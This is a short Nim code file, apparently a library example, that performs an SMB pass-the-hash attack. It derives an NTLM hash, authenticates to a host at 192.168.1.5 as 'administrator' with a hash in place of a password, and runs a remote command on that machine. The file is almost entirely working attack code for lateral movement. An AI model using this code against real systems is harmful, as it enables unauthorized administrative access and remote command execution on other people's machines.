#[
    SMB Pass The Hash example
]#

#SMB1

import SMB

let hash = toNTLMHash("Aa123456") # 47bf8039a8506cd67c524a03ff84ba4e
var smb = newSMB2("192.168.1.5", ".", "administrator", "f8011acf167c3261d807ca5a5301a94e")
let response = smb.connect()

smb.exec("mkdir c:\\kevinWeAreTheChampions", response)

smb.close()
echo "SMB closed properly" 